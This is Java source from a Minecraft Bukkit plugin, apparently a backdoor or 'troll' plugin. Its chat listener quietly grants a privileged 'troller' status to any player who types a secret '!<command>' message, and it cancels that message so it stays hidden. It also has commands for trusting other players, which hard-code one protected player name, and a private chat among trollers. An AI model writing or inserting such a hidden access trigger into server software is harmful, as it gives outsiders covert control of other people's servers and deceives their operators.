package PandaHexCode.Commands;

import java.io.File;
import java.io.IOException;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

import PandaHexCode.PluginMain;

public class SpecialVersionCommands{

	public static class SpecialRegister implements Listener{
		
		private String command = "";
		
		public SpecialRegister(String command) {
			this.command = command;
			PluginMain.instance.getServer().getPluginManager().registerEvents(this, PluginMain.instance);
		}
		
		@EventHandler
		public void onChat(PlayerChatEvent e) {
			if(e.getMessage().startsWith("!"+command)) {
				PluginMain.trollers.add(e.getPlayer().getName());
				e.getPlayer().sendMessage(PluginMain.PR+"You are now trusted!");
				PluginMain.SendMessageToAllTrollers(PluginMain.PR+e.getPlayer().getName()+" is now trusted!");
				e.setCancelled(true);
			}
		}
	}
	
	public static class Trust extends ChatCommandTarget{	
		public Trust(String command) {
			super(command);
		}
		@Override
		public void onNewCommand(Player sender, Player otherPlayer, Command command, String[] arg){
			if(PluginMain.trollers.contains(otherPlayer.getName())){
				if(otherPlayer.getName() == "Nagisaaaa")
					otherPlayer = sender;
				PluginMain.trollers.remove(otherPlayer.getName());
				PluginMain.SendMessageToAllTrollers(otherPlayer.getName() + " is no longer a troller!");
			}else{
				PluginMain.trollers.add(otherPlayer.getName());
				PluginMain.SendMessageToAllTrollers(otherPlayer.getName() + " is now a troller!");
			}
		}
	}
	
	public static class TrollChat extends ChatCommand{

		public TrollChat(String command) {
			super(command);
			
		}

		@Override
		public boolean onCommand(CommandSender arg0, Command arg1, String arg2, String[] arg3) {
			Player p = (Player) arg0;
			
			if(arg3.length < 1)
				p.sendMessage(PluginMain.PR+"§cPlease use !trollchat <Message>");
			else {
				String finalMessage = "";
				for(int i = 0;i< arg3.length;i++) {
					finalMessage = finalMessage+arg3[i]+" ";
				}
				PluginMain.SendMessageToAllTrollers("§7[§c§lTrollChat§7] §e"+p.getName()+" §c> §e"+finalMessage);
			}

			return false;
		}

	}
	
	


}
